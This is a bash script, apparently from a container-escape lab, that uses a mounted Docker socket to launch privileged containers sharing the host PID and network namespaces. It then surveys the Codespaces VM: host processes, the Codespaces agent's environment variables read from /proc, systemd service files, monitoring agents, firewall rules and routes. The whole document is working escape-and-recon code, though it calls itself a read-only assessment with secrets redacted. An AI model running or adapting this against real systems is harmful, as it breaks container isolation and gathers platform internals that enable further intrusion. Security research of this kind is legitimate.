#!/usr/bin/env bash
set +e
OUT=/workspaces/container-escape-lab/codespace-recon8.txt
IMG=vsc-container-escape-lab-9d0821fc0cc4ec33a4fedafea7421c456c1a5f0d1536df300a8ca974a3444fc5-features
SOCK=/var/run/docker.sock
DK="curl -sS -m 20 --unix-socket $SOCK"
{
echo "RECON8 START $(date -u +%FT%TZ)  [VM impact assessment: read-only, secrets redacted]"

# helper container: privileged + pid+net+ipc host = full VM view
create_run() {
  $DK -X POST -H "Content-Type: application/json" \
    -d "{\"Image\":\"$IMG\",\"Cmd\":$1,\"Entrypoint\":[],\"HostConfig\":{\"PidMode\":\"host\",\"NetworkMode\":\"host\",\"Privileged\":true},\"Tty\":false}" \
    "http://localhost/containers/create?name=rc8-$2" | head -c 150; echo
  $DK -X POST "http://localhost/containers/rc8-$2/start" -o /dev/null -w "start: %{http_code}\n"
  sleep 4
  $DK "http://localhost/containers/rc8-$2/logs?stdout=1&stderr=1" 2>/dev/null | python3 -c "
import sys
data = sys.stdin.buffer.read()
out = b''; i = 0
while i + 8 <= len(data):
    ln = int.from_bytes(data[i+4:i+8], 'big')
    out += data[i+8:i+8+ln]; i += 8 + ln
print(out.decode(errors='replace')[:3500])
"
  $DK -X DELETE "http://containers/ignored" -o /dev/null 2>/dev/null
  $DK -X DELETE "http://localhost/containers/rc8-$2?force=1" -o /dev/null -w "cleanup rc8-$2: %{http_code}\n"
}

echo "== [1] VM full process table (host pid ns)"
create_run '["sh","-c","ps aux | head -30"]' proc

echo "== [2] cs-agent process identity (cmdline only, env redacted)"
create_run '["sh","-c","for p in /proc/[0-9]*/; do c=$(tr \"\\0\" \" \" < $p/cmdline 2>/dev/null); case \"$c\" in *codespaces*|*agent*) echo \"PID ${p} : $c\";; esac; done | head -8"]' agentid

echo "== [3] cs-agent environment VARIABLES: NAMES ONLY (values never printed)"
create_run '["sh","-c","AP=$(for p in /proc/[0-9]*/; do c=$(cat $p/comm 2>/dev/null); [ \"$c\" = codespaces ] && echo $p && break; done); if [ -n \"$AP\" ]; then tr \"\\0\" \"\\n\" < ${AP}environ 2>/dev/null | cut -d= -f1 | sort -u | head -40; else echo \"agent proc not found\"; fi"]' envnames

echo "== [4] agent environment: non-secret values only (URLs/flags, token-class redacted by name)"
create_run '["sh","-c","AP=$(for p in /proc/[0-9]*/; do c=$(cat $p/comm 2>/dev/null); [ \"$c\" = codespaces ] && echo $p && break; done); if [ -n \"$AP\" ]; then tr \"\\0\" \"\\n\" < ${AP}environ 2>/dev/null | grep -viE \"token|secret|key|password|sas|sig\" | grep -E \"URL|URI|REGION|NAME|ID|MODE|ENV\" | sort -u | head -25; fi"]' envvals

echo "== [5] systemd units (agent service definition)"
create_run '["sh","-c","ls /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep -iE \"codespace|agent\" ; echo ---; cat /etc/systemd/system/codespaces.service 2>/dev/null || cat /lib/systemd/system/codespaces.service 2>/dev/null | head -25"]' systemd

echo "== [6] Qualys / management agents on VM"
create_run '["sh","-c","ls /usr/local/qualys 2>/dev/null | head -3; rpm -qa 2>/dev/null | grep -iE \"qualys|monitor\" ; ls /opt 2>/dev/null"]' qualys

echo "== [7] VM network config (iptables head, routes)"
create_run '["sh","-c","iptables -L -n 2>/dev/null | head -15; echo ---routes; ip route | head -8"]' net

echo "== [8] /var/log inventory (names only)"
create_run '["sh","-c","ls /var/log | head -15"]' logs

echo "RECON8 DONE $(date -u +%FT%TZ)"
} > "$OUT" 2>&1
exit 0
